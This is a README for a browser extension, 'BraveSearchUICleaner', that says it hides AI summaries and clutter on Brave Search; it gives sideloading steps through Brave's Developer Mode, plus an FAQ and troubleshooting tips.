# 🧹 BraveSearchUICleaner - Get a clean and simple search experience

[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Appleofperufamilyfasciolidae631/BraveSearchUICleaner/releases)

BraveSearchUICleaner simplifies your search interface. It removes AI summaries, clutter, and unnecessary elements from Brave Search. You see only your search results. This project makes your browsing experience faster and easier on your eyes.

## 📋 What This Does

This tool functions as a browser extension. It modifies how Brave Search looks in your browser to give you a calm, minimal layout.

*   Removes AI-generated summaries from search pages.
*   Hides sidebars that contain filler content.
*   Simplifies result layouts for better readability.
*   Removes elements that track or distract you.

## ⚙️ Requirements

You need the following to run this tool:

1.  A computer running Windows 10 or Windows 11.
2.  The Brave Browser installed on your machine.
3.  An active internet connection to download the files.

## 📥 How to Install

Follow these steps to set up the extension on your computer.

### Step 1: Visit the page
Visit this page to download the project files: [https://github.com/Appleofperufamilyfasciolidae631/BraveSearchUICleaner/releases](https://github.com/Appleofperufamilyfasciolidae631/BraveSearchUICleaner/releases)

### Step 2: Download the source code
Look for the section labeled "Assets" on the release page. Click the link that says "Source code (zip)". This downloads a compressed folder to your computer.

### Step 3: Unzip the file
Find the folder you just downloaded in your Downloads folder. Right-click the folder and select "Extract All". Choose a location on your hard drive to save the extracted files. Remember this location.

### Step 4: Open Brave extensions
Open the Brave Browser. Click the three horizontal lines in the top right corner. Select "Extensions" from the menu.

### Step 5: Enable Developer Mode
In the Extensions menu, look for a switch in the top right corner labeled "Developer mode". Click it so the switch turns blue. This allows you to load custom extensions.

### Step 6: Load the tool
Click the button labeled "Load unpacked" in the top left corner of the Extensions page. Navigate to the folder where you saved the files in Step 3. Select that folder and click "Select Folder".

The extension now appears in your list of active extensions. It starts working immediately whenever you visit Brave Search.

## 🛠️ How to Use

Once you install the extension, it runs in the background. You do not need to click any buttons or change settings.

1.  Open Brave Browser.
2.  Type a search query into the search bar.
3.  Press Enter.
4.  The browser displays the clean, minimal result page.

If you ever want to see the original Brave Search layout again, return to the Extensions menu and toggle the switch for "BraveSearchUICleaner" to "Off". Refresh your search tab to see the changes.

## ❓ Frequently Asked Questions

**Does this software store my search history?**
No. This extension only changes the appearance of the web page. It does not track, save, or send your data to any third party.

**Can I use this on other browsers?**
This tool works best on Brave Browser. It might function on other Chromium-based browsers, but we do not provide support for those.

**Does it remove all AI features?**
Yes. The extension identifies the code that builds AI summaries and prevents it from appearing on your screen.

**Is it free?**
Yes. You can download and use the software at no cost.

**How do I update the tool?**
Check the release page periodically for new versions. If you notice a new version, follow the installation steps again. You may need to remove the old version before loading the new one to ensure everything works correctly.

## 📝 Troubleshooting

If the cleanup does not happen, try these steps:

1.  Refresh the search page by pressing Ctrl + R on your keyboard.
2.  Make sure the extension is enabled in the Extensions menu.
3.  Check that you selected the correct folder after clicking "Load unpacked".
4.  Restart the Brave Browser completely.

If you find a bug or something does not look right, you can report it on the repository page. Provide a description of what you see and what version of Brave Browser you use.
